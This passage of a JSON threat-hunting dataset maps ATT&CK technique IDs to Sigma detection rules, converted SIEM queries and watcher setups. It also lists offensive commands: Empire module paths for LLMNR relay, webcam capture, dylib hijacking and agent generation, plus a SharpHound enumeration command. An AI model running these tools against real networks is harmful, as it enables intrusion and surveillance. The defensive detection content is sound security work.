selection\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(NewProcessName.keyword:*\\\\\\\\bcdedit.exe AND ProcessCommandLine.keyword:(*delete* OR *deletevalue* OR *import*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Possible-Ransomware-or-unauthorized-MBR-modifications <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Possible Ransomware or unauthorized MBR modifications\",\\n    \"description\": \"Detects, possibly, malicious unauthorized usage of bcdedit.exe\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1070\",\\n      \"attack.persistence\",\\n      \"attack.t1067\"\\n    ],\\n    \"query\": \"(NewProcessName.keyword:*\\\\\\\\\\\\\\\\bcdedit.exe AND ProcessCommandLine.keyword:(*delete* OR *deletevalue* OR *import*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(NewProcessName.keyword:*\\\\\\\\\\\\\\\\bcdedit.exe AND ProcessCommandLine.keyword:(*delete* OR *deletevalue* OR *import*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Possible Ransomware or unauthorized MBR modifications\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(NewProcessName.keyword:*\\\\\\\\bcdedit.exe AND ProcessCommandLine.keyword:(*delete* *deletevalue* *import*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(NewProcessName=\"*\\\\\\\\bcdedit.exe\" (ProcessCommandLine=\"*delete*\" OR ProcessCommandLine=\"*deletevalue*\" OR ProcessCommandLine=\"*import*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" NewProcessName=\"*\\\\\\\\bcdedit.exe\" ProcessCommandLine IN [\"*delete*\", \"*deletevalue*\", \"*import*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\bcdedit\\\\.exe)(?=.*(?:.*.*delete.*|.*.*deletevalue.*|.*.*import.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/inveigh", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/inveigh", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/inveigh_relay", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/inveigh_relay", "name": "Empire Module Command"}], "command_list": ["powershell/collection/inveigh", "powershell/collection/inveigh", "powershell/lateral_movement/inveigh_relay", "powershell/lateral_movement/inveigh_relay"], "technique_id": "T1171", "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1171", "Empire Module": "powershell/collection/inveigh", "Technique": "LLMNR/NBT-NS Poisoning", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/inveigh\":  [\"T1171\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1171", "Empire Module": "powershell/lateral_movement/inveigh_relay", "Technique": "LLMNR/NBT-NS Poisoning", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/inveigh_relay\":  [\"T1171\"],"}}], "queries": [{"query": "title: RottenPotato Like Attack Pattern\nid: 16f5d8ca-44bd-47c8-acbe-6fc95a16c12f\nstatus: experimental\ndescription: Detects logon events that have characteristics of events generated during an attack with RottenPotato and the like\nreferences:\n    - https://twitter.com/SBousseaden/status/1195284233729777665\nauthor: \"@SBousseaden, Florian Roth\"\ndate: 2019/11/15\ntags:\n    - attack.privilege_escalation\n    - attack.credential_access\n    - attack.t1171\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4624\n        LogonType: 3\n        TargetUserName: 'ANONYMOUS_LOGON'\n        WorkstationName: '-'\n        SourceNetworkAddress: '127.0.0.1'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: RottenPotato Like Attack Pattern\nid: 16f5d8ca-44bd-47c8-acbe-6fc95a16c12f\nstatus: experimental\ndescription: Detects logon events that have characteristics of events generated during an attack with RottenPotato and the like\nreferences:\n    - https://twitter.com/SBousseaden/status/1195284233729777665\nauthor: \"@SBousseaden, Florian Roth\"\ndate: 2019/11/15\ntags:\n    - attack.privilege_escalation\n    - attack.credential_access\n    - attack.t1171\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4624\n        LogonType: 3\n        TargetUserName: 'ANONYMOUS_LOGON'\n        WorkstationName: '-'\n        SourceNetworkAddress: '127.0.0.1'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4624\" AND LogonType:\"3\" AND TargetUserName:\"ANONYMOUS_LOGON\" AND WorkstationName:\"\\\\-\" AND SourceNetworkAddress:\"127.0.0.1\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/RottenPotato-Like-Attack-Pattern <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"RottenPotato Like Attack Pattern\",\\n    \"description\": \"Detects logon events that have characteristics of events generated during an attack with RottenPotato and the like\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.credential_access\",\\n      \"attack.t1171\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4624\\\\\" AND LogonType:\\\\\"3\\\\\" AND TargetUserName:\\\\\"ANONYMOUS_LOGON\\\\\" AND WorkstationName:\\\\\"\\\\\\\\-\\\\\" AND SourceNetworkAddress:\\\\\"127.0.0.1\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4624\\\\\" AND LogonType:\\\\\"3\\\\\" AND TargetUserName:\\\\\"ANONYMOUS_LOGON\\\\\" AND WorkstationName:\\\\\"\\\\\\\\-\\\\\" AND SourceNetworkAddress:\\\\\"127.0.0.1\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'RottenPotato Like Attack Pattern\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4624\" AND LogonType:\"3\" AND TargetUserName:\"ANONYMOUS_LOGON\" AND WorkstationName:\"\\\\-\" AND SourceNetworkAddress:\"127.0.0.1\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4624\" LogonType=\"3\" TargetUserName=\"ANONYMOUS_LOGON\" WorkstationName=\"-\" SourceNetworkAddress=\"127.0.0.1\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4624\" logon_type=\"3\" TargetUserName=\"ANONYMOUS_LOGON\" WorkstationName=\"-\" SourceNetworkAddress=\"127.0.0.1\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4624)(?=.*3)(?=.*ANONYMOUS_LOGON)(?=.*-)(?=.*127\\\\.0\\\\.0\\\\.1))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1066", "parsed_datasets": [], "queries": [{"query": "title: Secure Deletion with SDelete\nid: 39a80702-d7ca-4a83-b776-525b1f86a36d\nstatus: experimental\ndescription: Detects renaming of file while deletion with SDelete tool\nauthor: Thomas Patzke\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet\n    - https://www.jpcert.or.jp/english/pub/sr/ir_research.html\n    - https://technet.microsoft.com/en-us/en-en/sysinternals/sdelete.aspx\ntags:\n    - attack.defense_evasion\n    - attack.t1107\n    - attack.t1066\n    - attack.s0195\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 4656\n            - 4663\n            - 4658\n        ObjectName:\n            - '*.AAA'\n            - '*.ZZZ'\n    condition: selection\nfalsepositives:\n    - Legitime usage of SDelete\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Secure Deletion with SDelete\nid: 39a80702-d7ca-4a83-b776-525b1f86a36d\nstatus: experimental\ndescription: Detects renaming of file while deletion with SDelete tool\nauthor: Thomas Patzke\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet\n    - https://www.jpcert.or.jp/english/pub/sr/ir_research.html\n    - https://technet.microsoft.com/en-us/en-en/sysinternals/sdelete.aspx\ntags:\n    - attack.defense_evasion\n    - attack.t1107\n    - attack.t1066\n    - attack.s0195\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 4656\n            - 4663\n            - 4658\n        ObjectName:\n            - '*.AAA'\n            - '*.ZZZ'\n    condition: selection\nfalsepositives:\n    - Legitime usage of SDelete\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:(\"4656\" OR \"4663\" OR \"4658\") AND ObjectName.keyword:(*.AAA OR *.ZZZ))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Secure-Deletion-with-SDelete <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Secure Deletion with SDelete\",\\n    \"description\": \"Detects renaming of file while deletion with SDelete tool\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1107\",\\n      \"attack.t1066\",\\n      \"attack.s0195\"\\n    ],\\n    \"query\": \"(EventID:(\\\\\"4656\\\\\" OR \\\\\"4663\\\\\" OR \\\\\"4658\\\\\") AND ObjectName.keyword:(*.AAA OR *.ZZZ))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"4656\\\\\" OR \\\\\"4663\\\\\" OR \\\\\"4658\\\\\") AND ObjectName.keyword:(*.AAA OR *.ZZZ))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Secure Deletion with SDelete\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:(\"4656\" \"4663\" \"4658\") AND ObjectName.keyword:(*.AAA *.ZZZ))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"4656\" OR EventID=\"4663\" OR EventID=\"4658\") (ObjectName=\"*.AAA\" OR ObjectName=\"*.ZZZ\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id IN [\"4656\", \"4663\", \"4658\"] ObjectName IN [\"*.AAA\", \"*.ZZZ\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*4656|.*4663|.*4658))(?=.*(?:.*.*\\\\.AAA|.*.*\\\\.ZZZ)))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1000", "parsed_datasets": [], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/WebcamRecorder", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/WebcamRecorder", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/webcam", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/webcam", "name": "Empire Module Command"}], "command_list": ["powershell/collection/WebcamRecorder", "powershell/collection/WebcamRecorder", "python/collection/osx/webcam", "python/collection/osx/webcam"], "technique_id": "T1125", "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1125", "Empire Module": "powershell/collection/WebcamRecorder", "Technique": "Video Capture", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/WebcamRecorder\":  [\"T1125\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1125", "Empire Module": "python/collection/osx/webcam", "Technique": "Video Capture", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/webcam\":  [\"T1125\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/switch_listener", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/switch_listener", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "external/generate_agent", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "external/generate_agent", "name": "Empire Module Command"}], "command_list": ["powershell/management/switch_listener", "powershell/management/switch_listener", "external/generate_agent", "external/generate_agent"], "technique_id": "T1008", "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1008", "Empire Module": "powershell/management/switch_listener", "Technique": "Fallback Channels", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/switch_listener\":  [\"T1008\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1008", "Empire Module": "external/generate_agent", "Technique": "Fallback Channels", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"external/generate_agent\":  [\"T1008\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/findtrusteddocuments", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/findtrusteddocuments", "name": "Empire Module Command"}], "command_list": ["powershell/situational_awareness/host/findtrusteddocuments", "powershell/situational_awareness/host/findtrusteddocuments"], "technique_id": "T1213", "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1213", "Empire Module": "powershell/situational_awareness/host/findtrusteddocuments", "Technique": "Data from Information Repositories", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/findtrusteddocuments\":  [\"T1213\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/CreateHijacker", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/CreateHijacker", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/host/osx/HijackScanner", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/host/osx/HijackScanner", "name": "Empire Module Command"}], "command_list": ["python/persistence/osx/CreateHijacker", "python/persistence/osx/CreateHijacker", "python/situational_awareness/host/osx/HijackScanner", "python/situational_awareness/host/osx/HijackScanner"], "technique_id": "T1157", "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1157", "Empire Module": "python/persistence/osx/CreateHijacker", "Technique": "Dylib Hijacking", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/persistence/osx/CreateHijacker\":  [\"T1157\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1157", "Empire Module": "python/situational_awareness/host/osx/HijackScanner", "Technique": "Dylib Hijacking", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/host/osx/HijackScanner\":  [\"T1157\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/chronos_api_add_job", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/chronos_api_add_job", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/chronos_api_delete_job", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/chronos_api_delete_job", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/chronos_api_start_job", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/chronos_api_start_job", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/marathon_api_create_start_app", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/marathon_api_create_start_app", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/marathon_api_delete_app", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/marathon_api_delete_app", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/http_rest_api", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/http_rest_api", "name": "Empire Module Command"}], "command_list": ["python/situational_awareness/network/dcos/chronos_api_add_job", "python/situational_awareness/network/dcos/chronos_api_add_job", "python/situational_awareness/network/dcos/chronos_api_delete_job", "python/situational_awareness/network/dcos/chronos_api_delete_job", "python/situational_awareness/network/dcos/chronos_api_start_job", "python/situational_awareness/network/dcos/chronos_api_start_job", "python/situational_awareness/network/dcos/marathon_api_create_start_app", "python/situational_awareness/network/dcos/marathon_api_create_start_app", "python/situational_awareness/network/dcos/marathon_api_delete_app", "python/situational_awareness/network/dcos/marathon_api_delete_app", "python/situational_awareness/network/http_rest_api", "python/situational_awareness/network/http_rest_api"], "technique_id": "T1106", "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1106", "Empire Module": "python/situational_awareness/network/dcos/chronos_api_add_job", "Technique": "Execution through API", "ATT&CK Technique #2": "T1168", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/dcos/chronos_api_add_job\":  [\"T1106\",\"T1168\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1106", "Empire Module": "python/situational_awareness/network/dcos/chronos_api_delete_job", "Technique": "Execution through API", "ATT&CK Technique #2": "T1168", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/dcos/chronos_api_delete_job\":  [\"T1106\",\"T1168\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1106", "Empire Module": "python/situational_awareness/network/dcos/chronos_api_start_job", "Technique": "Execution through API", "ATT&CK Technique #2": "T1168", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/dcos/chronos_api_start_job\":  [\"T1106\",\"T1168\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1106", "Empire Module": "python/situational_awareness/network/dcos/marathon_api_create_start_app", "Technique": "Execution through API", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/dcos/marathon_api_create_start_app\":  [\"T1106\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1106", "Empire Module": "python/situational_awareness/network/dcos/marathon_api_delete_app", "Technique": "Execution through API", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/dcos/marathon_api_delete_app\":  [\"T1106\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1106", "Empire Module": "python/situational_awareness/network/http_rest_api", "Technique": "Execution through API", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/http_rest_api\":  [\"T1106\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nSharpHound.exe -c ALL", "name": "Dos"}], "command_list": ["Dos\nSharpHound.exe -c ALL"], "technique_id": "T1049 / 1069", "parsed_datasets": [], "queries": [{"query": "Yml\ntitle: win-bloodhound use\ndescription: windows server 2012\nreferences:\ntags: T1049 / 1069\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 5145 # checked whether the network shared objects can grant access needed by clients.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objecttype: 'File' # network information> Object Type\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceaddress: '*' # Network Information> Source Address\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0sourceport: '*' # network information> source port\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ShareName: '\\\\ * \\ IPC $' # Share Information> Share Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Relativetargetname: # share information> relative to the target name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- NETLOGON\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- lsarpc\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- samr\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- srvsvc\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- winreg\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- wkssvc\n\u00a0\u00a0\u00a0\u00a0timeframe: last 30s # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1069 AD privileged group / user enumeration", "parsed_datasets": [], "queries": [{"query": "Yml\ntitle: AD domain authority and the user group enumeration\ndescription: win7 test, windows service 2008 (the domain controller)\nreferences: http://www.polaris-lab.com/index.php/archives/42/\ntags: T1087 / T1069\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4661 # has been requested to handle objects\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objecttype: # Object> Object Type\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- SAM_USER\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- SAM_GROUP\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objectname: # Object> object name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 502'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 512'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 500'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 505'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 519'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 520'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 544'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 551'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 555'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processname: 'C: \\ Windows 